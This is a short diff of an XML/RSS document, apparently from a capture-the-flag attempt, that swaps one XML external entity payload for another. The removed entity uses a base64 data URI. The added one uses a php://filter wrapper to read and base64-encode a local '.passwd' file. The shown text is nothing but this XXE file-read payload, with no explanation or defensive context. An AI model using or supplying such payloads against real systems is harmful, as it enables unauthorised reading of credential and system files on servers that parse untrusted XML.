@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <!DOCTYPE title [
-    <!ENTITY test SYSTEM "data://text/plain;base64,ZmlsZTovLy5wYXNzd2Q=">
+    <!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=.passwd">
 ]>
 <rss version="2.0">
 <channel>
